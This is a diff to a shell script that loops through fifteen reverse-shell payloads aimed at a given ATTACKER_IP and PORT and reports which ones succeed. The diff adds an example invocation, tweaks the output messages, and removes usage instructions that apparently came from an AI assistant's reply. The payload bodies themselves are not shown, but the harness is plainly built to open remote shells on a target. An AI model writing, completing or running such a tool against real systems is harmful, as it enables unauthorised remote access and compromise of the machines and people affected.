@@ -5,6 +5,7 @@
 # Function to display usage
 usage() {
     echo "Usage: $0 ATTACKER_IP PORT"
+    echo "Example: ./shell_check.sh 192.168.1.100 443"
     exit 1
 }
 
@@ -26,9 +27,9 @@ run_payload() {
 
     # Check if the last command succeeded
     if [ $? -eq 0 ]; then
-        echo "$DESC - Success"
+        echo "$DESC - Success!!!"
     else
-        echo "$DESC - Failed"
+        echo "$DESC - Failed :( "
     fi
 }
 
@@ -83,18 +84,3 @@ run_payload "$PAYLOAD_13" "$DESC_13"
 run_payload "$PAYLOAD_14" "$DESC_14"
 run_payload "$PAYLOAD_15" "$DESC_15"
 
-
-
-
-
-### Instructions
-#1. Save this script to a file, for example `run_reverse_shells.sh`.
-#2. Make the script executable: `chmod +x run_reverse_shells.sh`.
-#3. Run the script with `ATTACKER_IP` and `PORT` as arguments: `./run_reverse_shells.sh ATTACKER_IP PORT`.
-
-#For example:
-./run_reverse_shells.sh 192.168.1.100 443
-
-#If you run the script without arguments or with the wrong number of arguments, it will print the usage message and exit.
-
-#This should give you more flexibility while ensuring proper usage. If you have any further questions or need additional adjustments, feel free to let me know!
